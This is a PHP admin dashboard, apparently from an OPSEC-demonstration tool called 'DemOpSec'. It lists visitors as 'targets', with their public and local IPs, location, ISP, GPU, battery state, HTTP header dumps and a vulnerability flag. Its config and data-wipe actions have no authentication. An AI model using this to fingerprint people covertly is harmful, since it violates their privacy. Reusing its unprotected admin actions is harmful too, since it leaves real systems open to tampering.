<?php
$dbFile = __DIR__ . '/presenca.db';

try {
    $pdo = new PDO("sqlite:" . $dbFile);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Salvar Configurações (Acontece antes de carregar a página)
    if (isset($_POST['action']) && $_POST['action'] === 'save_config') {
        $updateStmt = $pdo->prepare("UPDATE app_config SET config_value = ? WHERE config_key = ?");
        foreach ($_POST['config'] as $key => $value) {
            $updateStmt->execute([$value, $key]);
        }
        header("Location: setup.php?config_saved=1");
        exit;
    }

    // Resetar Banco (Apaga apenas a tabela presencas)
    if (isset($_POST['action']) && $_POST['action'] === 'reset_db') {
        $pdo->exec("DELETE FROM presencas");
        header("Location: setup.php?reset=success");
        exit;
    }

    // Carregar configurações atuais
    $stmt = $pdo->query("SELECT config_key, config_value FROM app_config");
    $CONFIG = $stmt->fetchAll(PDO::FETCH_KEY_PAIR);

    // Carregar registros de acesso
    $stmt = $pdo->query("SELECT * FROM presencas ORDER BY data_hora DESC");
    $registros = $stmt->fetchAll(PDO::FETCH_ASSOC);
    $totalRegistros = count($registros);

} catch (PDOException $e) {
    die("Acesse index.php primeiro para inicializar o Banco de Dados. Erro: " . $e->getMessage());
}
?>
<!DOCTYPE html>
<html lang="pt-BR" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= htmlspecialchars($CONFIG['titulo_dashboard']) ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
    <link rel="stylesheet" href="https://cdn.datatables.net/1.13.6/css/jquery.dataTables.min.css">
    <script src="https://cdn.datatables.net/1.13.6/js/jquery.dataTables.min.js"></script>
    <style>
        .dataTables_wrapper { color: #94a3b8 !important; }
        .dataTables_wrapper input, .dataTables_wrapper select { background-color: #0f172a; border: 1px solid #334155; color: white; padding: 4px 10px; border-radius: 6px;}
        table.dataTable thead th { border-bottom: 1px solid #334155; color: #cbd5e1; }
        table.dataTable tbody tr:hover { background-color: rgba(30, 41, 59, 0.8) !important; }
        .dataTables_wrapper .paginate_button.current { background: #10b981 !important; color: white !important; border: none;}
        .scrollbar-terminal::-webkit-scrollbar { width: 6px; }
        .scrollbar-terminal::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
    </style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen font-sans p-4 overflow-x-hidden">

    <div class="max-w-[1500px] mx-auto space-y-6">
        
        <?php if (isset($_GET['reset'])): ?>
            <div class="bg-red-500/20 text-red-400 p-4 rounded-lg border border-red-500 text-center font-bold">Base de alvos resetada com sucesso!</div>
        <?php endif; ?>
        <?php if (isset($_GET['config_saved'])): ?>
            <div class="bg-emerald-500/20 text-emerald-400 p-4 rounded-lg border border-emerald-500 text-center font-bold">Configurações da aplicação atualizadas!</div>
        <?php endif; ?>

        <!-- Header e Controles -->
        <div class="flex flex-col md:flex-row justify-between items-center bg-slate-900 p-6 rounded-xl border border-slate-800 shadow-xl">
            <div>
                <h1 class="text-2xl font-black text-white flex items-center gap-3">
                    <span class="w-3 h-3 rounded-full bg-red-500 animate-pulse"></span>
                    <?= htmlspecialchars($CONFIG['titulo_dashboard']) ?>
                </h1>
                <p class="text-slate-400 mt-1">DemOpSec - Painel de Controle</p>
            </div>
            
            <div class="flex items-center gap-4 mt-4 md:mt-0">
                <div class="text-center px-4 py-2 bg-slate-800 rounded-lg border border-slate-700">
                    <p class="text-xs text-slate-400 uppercase">Alvos</p>
                    <p class="text-xl font-bold text-emerald-400"><?= $totalRegistros ?></p>
                </div>
                
                <button onclick="document.getElementById('configModal').classList.toggle('hidden')" class="bg-slate-700 hover:bg-slate-600 text-white px-4 py-3 rounded-lg font-bold text-sm transition-all flex items-center gap-2">
                    ⚙️ Configurar App
                </button>
                
                <form method="POST" onsubmit="return confirm('Tem certeza que deseja apagar os acessos? As configurações serão mantidas.');">
                    <input type="hidden" name="action" value="reset_db">
                    <button type="submit" class="bg-red-600/20 hover:bg-red-600/40 text-red-500 border border-red-600/50 px-4 py-3 rounded-lg font-bold text-sm transition-all">
                        Limpar Dados
                    </button>
                </form>
            </div>
        </div>

        <!-- PAINEL DE CONFIGURAÇÕES OCULTO -->
        <div id="configModal" class="hidden bg-slate-800 border border-slate-700 p-6 rounded-xl shadow-2xl mb-6">
            <h2 class="text-xl font-bold text-white mb-4 border-b border-slate-700 pb-2">Configurações da Aplicação (Personalização)</h2>
            <form method="POST" class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <input type="hidden" name="action" value="save_config">
                
                <!-- Aparência -->
                <div class="space-y-4">
                    <h3 class="text-emerald-400 font-semibold uppercase text-xs">Títulos Gerais</h3>
                    <div>
                        <label class="block text-xs text-slate-400 mb-1">Título da Página (Formulário)</label>
                        <input type="text" name="config[titulo_pagina]" value="<?= htmlspecialchars($CONFIG['titulo_pagina']) ?>" class="w-full bg-slate-900 border border-slate-600 rounded p-2 text-white text-sm">
                    </div>
                    <div>
                        <label class="block text-xs text-slate-400 mb-1">Subtítulo (Formulário)</label>
                        <input type="text" name="config[subtitulo]" value="<?= htmlspecialchars($CONFIG['subtitulo']) ?>" class="w-full bg-slate-900 border border-slate-600 rounded p-2 text-white text-sm">
                    </div>
                    <div>
                        <label class="block text-xs text-slate-400 mb-1">Título do Dashboard</label>
                        <input type="text" name="config[titulo_dashboard]" value="<?= htmlspecialchars($CONFIG['titulo_dashboard']) ?>" class="w-full bg-slate-900 border border-slate-600 rounded p-2 text-white text-sm">
                    </div>
                </div>

                <!-- Campos do Formulário -->
                <div class="space-y-4">
                    <h3 class="text-emerald-400 font-semibold uppercase text-xs">Campos do Formulário (Selects)</h3>
                    <div class="flex gap-2">
                        <div class="w-1/3">
                            <label class="block text-xs text-slate-400 mb-1">Label do 1º Campo</label>
                            <input type="text" name="config[campo_1_label]" value="<?= htmlspecialchars($CONFIG['campo_1_label']) ?>" class="w-full bg-slate-900 border border-slate-600 rounded p-2 text-white text-sm">
                        </div>
                        <div class="w-2/3">
                            <label class="block text-xs text-slate-400 mb-1">Opções (Separadas por VÍRGULA)</label>
                            <input type="text" name="config[campo_1_opcoes]" value="<?= htmlspecialchars($CONFIG['campo_1_opcoes']) ?>" class="w-full bg-slate-900 border border-slate-600 rounded p-2 text-white text-sm">
                        </div>
                    </div>
                    <div class="flex gap-2">
                        <div class="w-1/3">
                            <label class="block text-xs text-slate-400 mb-1">Label do 2º Campo</label>
                            <input type="text" name="config[campo_2_label]" value="<?= htmlspecialchars($CONFIG['campo_2_label']) ?>" class="w-full bg-slate-900 border border-slate-600 rounded p-2 text-white text-sm">
                        </div>
                        <div class="w-2/3">
                            <label class="block text-xs text-slate-400 mb-1">Opções (Separadas por VÍRGULA)</label>
                            <input type="text" name="config[campo_2_opcoes]" value="<?= htmlspecialchars($CONFIG['campo_2_opcoes']) ?>" class="w-full bg-slate-900 border border-slate-600 rounded p-2 text-white text-sm">
                        </div>
                    </div>
                    <div class="flex gap-2">
                        <div class="w-1/2">
                            <label class="block text-xs text-slate-400 mb-1">Label do 3º Campo (Texto)</label>
                            <input type="text" name="config[campo_3_label]" value="<?= htmlspecialchars($CONFIG['campo_3_label']) ?>" class="w-full bg-slate-900 border border-slate-600 rounded p-2 text-white text-sm">
                        </div>
                        <div class="w-1/2">
                            <label class="block text-xs text-slate-400 mb-1">Exemplo de preenchimento</label>
                            <input type="text" name="config[campo_3_placeholder]" value="<?= htmlspecialchars($CONFIG['campo_3_placeholder']) ?>" class="w-full bg-slate-900 border border-slate-600 rounded p-2 text-white text-sm">
                        </div>
                    </div>
                </div>

                <div class="col-span-1 md:col-span-2 text-right">
                    <button type="submit" class="bg-emerald-600 hover:bg-emerald-500 text-white px-6 py-2 rounded-lg font-bold">Salvar Configurações</button>
                </div>
            </form>
        </div>
        <!-- FIM DO PAINEL DE CONFIGURAÇÕES -->

        <!-- Tabela -->
        <div class="bg-slate-900 border border-slate-800 rounded-xl p-6 shadow-xl overflow-visible">
            <table id="opsecTable" class="w-full text-left text-sm text-slate-300 display">
                <thead class="bg-slate-800 text-xs uppercase font-semibold">
                    <tr>
                        <th class="px-3 py-3">Identificação</th>
                        <th class="px-3 py-3 min-w-[200px]">Rede & Localização</th>
                        <th class="px-3 py-3">Status de Ameaça</th>
                        <th class="px-3 py-3">Hardware / Status</th>
                        <th class="px-3 py-3">Headers HTTP (DUMP)</th>
                        <th class="px-3 py-3">Registro</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-slate-800/50">
                    <?php foreach ($registros as $row): ?>
                        <?php 
                            $headers = json_decode($row['http_headers'], true) ?? [];
                            $isVuln = strpos($row['status_vuln'], 'CRÍTICO') !== false;
                        ?>
                        <tr>
                            <td class="px-3 py-3">
                                <div class="font-bold text-white text-base">
                                    <?= htmlspecialchars($row['val_campo_1'] . ' ' . $row['val_campo_3']) ?>
                                </div>
                                <div class="text-xs text-emerald-500 mt-1 uppercase font-bold tracking-wider">
                                    <?= htmlspecialchars($row['val_campo_2']) ?>
                                </div>
                                <div class="text-[10px] text-slate-600 font-mono mt-1">ID: <?= htmlspecialchars($row['visitor_id']) ?></div>
                            </td>
                            
                            <td class="px-3 py-3">
                                <div class="font-bold text-slate-300 text-sm mb-1">📍 <?= htmlspecialchars($row['localizacao']) ?></div>
                                <div class="font-mono text-cyan-300 text-xs">🌍 <?= htmlspecialchars($row['ip_address']) ?></div>
                                <div class="font-mono text-amber-400 text-xs mt-1">🏠 Int: <?= htmlspecialchars($row['ip_local']) ?></div>
                                <div class="text-[10px] text-slate-500 mt-1 uppercase tracking-wide"><?= htmlspecialchars($row['provedor']) ?></div>
                            </td>

                            <td class="px-3 py-3 text-xs">
                                <?php if ($isVuln): ?>
                                <span class="bg-red-500/20 text-red-400 border border-red-500/50 px-2 py-1.5 rounded font-bold block text-center shadow-[0_0_10px_rgba(239,68,68,0.2)]">
                                    <?= htmlspecialchars($row['status_vuln']) ?>
                                </span>
                                <?php else: ?>
                                <span class="bg-emerald-500/20 text-emerald-400 border border-emerald-500/50 px-2 py-1.5 rounded font-bold block text-center">
                                    <?= htmlspecialchars($row['status_vuln']) ?>
                                </span>
                                <?php endif; ?>
                            </td>

                            <td class="px-3 py-3 text-xs">
                                <div class="text-white truncate max-w-[160px] font-semibold">🖥️ <?= htmlspecialchars($row['gpu']) ?></div>
                                <div class="text-slate-400 mt-1">🔋 <?= htmlspecialchars($row['bateria']) ?> | 📶 <?= htmlspecialchars($row['conexao']) ?></div>
                                <div class="text-slate-500 mt-1">Tela: <?= htmlspecialchars($row['resolucao']) ?></div>
                            </td>

                            <td class="px-3 py-3 text-xs relative group cursor-crosshair">
                                <div class="bg-slate-950 p-2 rounded border border-slate-800 max-w-[150px] overflow-hidden whitespace-nowrap text-ellipsis text-slate-400 transition-colors group-hover:bg-slate-800 group-hover:border-slate-600 shadow-inner">
                                    <span class="text-emerald-400 font-bold mr-1">[{}]</span> <?= htmlspecialchars($row['user_agent']) ?>
                                </div>

                                <div class="opacity-0 invisible group-hover:opacity-100 group-hover:visible absolute z-[999] bottom-full right-0 mb-2 w-[450px] sm:w-[550px] bg-slate-950 border border-slate-600 shadow-[0_10px_40px_rgba(0,0,0,0.9)] rounded-xl p-4 transition-all duration-200">
                                    <div class="text-emerald-400 font-black text-xs mb-3 border-b border-slate-700 pb-2 uppercase tracking-widest">
                                        Dump RAW: Cabeçalhos HTTP
                                    </div>
                                    <div class="max-h-[300px] overflow-y-auto space-y-1 font-mono text-[11px] pr-2 scrollbar-terminal">
                                        <?php foreach ($headers as $key => $val): ?>
                                        <div class="break-words leading-tight flex flex-col border-b border-slate-800/60 pb-1 mb-1">
                                            <span class="text-cyan-400 font-bold"><?= htmlspecialchars($key) ?>:</span> 
                                            <span class="text-slate-300 ml-2"><?= htmlspecialchars($val) ?></span>
                                        </div>
                                        <?php endforeach; ?>
                                    </div>
                                </div>
                            </td>

                            <td class="px-3 py-3 text-xs text-slate-400 whitespace-nowrap font-mono">
                                <?= date('H:i:s', strtotime($row['data_hora'])) ?><br>
                                <span class="text-[10px] text-slate-500"><?= date('d/m/Y', strtotime($row['data_hora'])) ?></span>
                            </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            $('#opsecTable').DataTable({
                "language": {
                    "search": "🔍 Filtrar:",
                    "lengthMenu": "Mostrar _MENU_ alvos",
                    "info": "Página _PAGE_ de _PAGES_",
                    "zeroRecords": "Nenhum alvo encontrado",
                    "paginate": { "previous": "Anterior", "next": "Próximo" }
                },
                "order": [[ 5, "desc" ]], 
                "pageLength": 15
            });
        });
    </script>
    </body>
</html>
